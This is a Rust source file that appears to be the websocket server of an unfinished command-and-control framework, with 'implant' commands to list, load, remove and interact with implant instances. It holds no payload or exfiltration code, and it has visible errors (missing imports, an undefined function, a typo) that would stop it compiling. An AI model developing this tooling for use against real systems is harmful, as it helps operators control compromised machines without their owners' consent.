mod instance;
mod builder;
mod stream;
mod binary;
mod cipher;
mod utils;
mod types;
mod error;

use std::env;
use std::net::SocketAddr;

use tokio_tungstenite::tungstenite::protocol::Message;
use tokio::net::{ TcpListener, TcpStream };
use futures::{ StreamExt, SinkExt };

use crate::instance::{ list_instances, load_instance, remove_instance };
use crate::types::ServerPacket;
use crate::utils::print_help;

type SenderSink = SplitSink<WebSocketStream<TcpStream>, Message>;
type RecvStream = SplitStream<WebSocketStream<TcpStream>>;

async fn interact_instance(sender: &mut SenderSink, receiver: &mut RecvStream, args: Vec<&str>) {
// TODO: implement and move to instance.rs
}

async fn parse_command(sender: &mut SenderSink, receiver: &mut RecvStream, buffer: String) {
	let args: Vec<&str> = buffer.split_whitespace().collect();

	println!("[INF] matching arguments");
	match args[0] {
		"help" => sender.send(Message::Text(print_help())).await,
		"exit" => sender.send(Message::Text("[INF] exiting...")).await,

		"implant" => {
			if args.len() < 2 {
				sender.send(Message::Text("[ERR] invalid input")).await;
				return
			}
			match args[1] {
				"ls"   => list_instances(sender).await,
				"load" => load_instance(sender, args).await,
				"rm"   => remove_instance(sender, args).await,
				"i"    => interact_instance(sender, receiver, args).await,
				_      => sender.send(Message::Text("[ERR] invalid input")).await
			}
		}
		_ => sender.send(Message::Text("[ERR] invalid input")).await;
	}
}

async fn process_packet(sender: &mut SenderSink, receiver: &mut RecvStream, msg: String) -> String {
	println!("[DBG] processing packet");

	let des: ServerPacket = match serde_json::from_str::<ServerPacket>(msg.as_str()) {
		Ok(des) => des,
		Err(e) => {
			println!("[ERR] process_packet: invalid packet structure from user: {}", e);
			return format!("[ERR] process_packet: invalid packet structure from user: {}", e)
		}
	};

	match des.msg_type {
		MessageType::TypeCommand => parse_command(sender, receiver, des.buffer).await,
		MessageType::TypeConfig => parse_config(sender, reveiver, des.buffer).await,
		_ => return "[ERR] invalid input".to_string()
	}
}

async fn handle_connection(stream: TcpStream) {
    let ws_stream = match tokio_tungstenite::accept_async(stream).await {
        Ok(ws) => ws,
        Err(e) => {
            println!("[ERR] handle_error during websocket handshake: {}", e);
            return
        }
    };

    let (mut sender, mut receiver) = ws_stream.split();

    while let Some(msg) = receiver.next().await {
        match msg {
            Ok(Message::Text(msg)) => {
				println!("[DBG] incoming json message from client");
                let rsp = process_packet(sender, receiver, msg).await;

				println!("[DBG] sending response: {:?}", rsp);
                if let Err(e) = sender.send(Message::Text(rsp)).await {
                    println!("[ERR] handle_connection: sending \"json message\" message failed: {}", e);
                }
            },
            Ok(Message::Close(_)) => {
				println!("[DBG] closing client websocket");

				if let Err(e) = sender.send(Message::Text("closing...".to_string())).await {
					println!("[ERR] handle_connection: sending \"close connection\" message failed: {}", e);
				}
                break;
            },
            Err(e)=> {
				println!("[DBG] error parsing message from client");

                if let Err(e) = sender.send(Message::Text(format!("{}", e))).await {
					println!("[ERR] handle_connection: sending \"receive message\" message failed: {}", e);
				}
                break;
            }
            Ok(_) => {
				println!("[DBG] unhandled message type from client");

                if let Err(e) = sender.send(Message::Text("unhandled message".to_string())).await {
					println!("[ERR] handle_connection: sending \"invalid message\" message failed: {}", e);
				}
            },
        }
    }
}

#[tokio::main]
async fn main() {
    let addr = env::args()
		.nth(1)
		.unwrap_or_else(|| "127.0.0.1:3000".to_string());

    let addr: SocketAddr = addr.parse()
		.expect("tokio::main: invalid address");

    let listener = TcpListener::bind(&addr).await
		.expect("tokio::main: could not bind");

    println!("[INF] listening on: {}", addr);
    while let Ok((stream, _)) = listener.accept().await {
        tokio::spawn(handle_connection(stream));
    }
}
